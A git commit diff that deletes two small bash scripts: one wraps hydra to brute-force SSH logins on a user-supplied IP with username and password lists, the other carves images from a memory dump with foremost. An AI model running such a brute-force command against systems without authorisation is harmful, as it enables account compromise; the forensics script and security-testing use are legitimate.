1115454d54c49437a9d84946f432e36c7ae7c8e5
Peter <157177875+petervancleave@users.noreply.github.com>
2025-03-13 15:39:46 -0600

    Delete BASHSCRIPTS directory

--- BASHSCRIPTS/Auto_SSH_BruteforceQUICK.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/bash
-
-echo "Enter target IP"
-read IP
-hydra -L users.txt -P passwords.txt ssh://$IP -t 4
--- BASHSCRIPTS/Screenshot_Extractor.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-echo "Enter memory dump file:"
-read dump
-foremost -t jpg,png -i "$dump" -o extracted
-echo "Images saved in 'extracted' folder."
-
-
-# Extracts images from RAM dumps using foremost
-
